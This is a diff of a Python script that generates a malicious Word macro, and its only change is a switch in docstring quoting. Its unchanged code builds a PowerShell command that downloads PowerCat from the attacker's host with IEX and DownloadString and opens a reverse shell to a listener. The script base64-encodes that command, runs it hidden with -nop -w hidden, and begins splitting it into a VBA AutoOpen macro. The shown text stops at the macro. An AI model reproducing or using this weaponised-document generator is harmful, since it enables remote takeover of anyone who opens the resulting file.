@@ -1,8 +1,8 @@
-'''
+"""
 Create a VBA Marco for Word to download PowerCat and 
 execute a reverse shell to a listener.
 
-'''
+"""
 
 import argparse
 import base64
@@ -18,17 +18,17 @@ parser.add_argument('-p', '--port', type=int, default=4444, help='Port of the li
 
 
 def create_reverse_shell(ip, port):
-    '''
+    """
     Create a reverse shell command to be executed in the target machine.
-    '''
+    """
     return (f"IEX(New-Object System.Net.WebClient).DownloadString('http://{ip}/powercat.ps1');"
            f"powercat -c {ip} -p {port} -e powershell")
 
 
 def encode_reverse_shell(string):
-    '''
+    """
     Base64 encode reverse shell command.
-    '''
+    """
     bytes_string = string.encode('utf-16le')
     encoded = base64.b64encode(bytes_string)
     base64_string = encoded.decode('utf-8')
@@ -36,16 +36,16 @@ def encode_reverse_shell(string):
 
 
 def build_ps_command(base64_string):
-    '''
+    """
     Build a PowerShell command to included in VBA macros.
-    '''
+    """
     return f"powershell.exe -nop -w hidden -e {base64_string}"
 
 
 def split_command_to_vba(string):
-    '''
+    """
     Write the powershell command in chunks of n characters to VBA macros.
-    '''
+    """
     n = 50
     vba_script = """
 Sub AutoOpen()
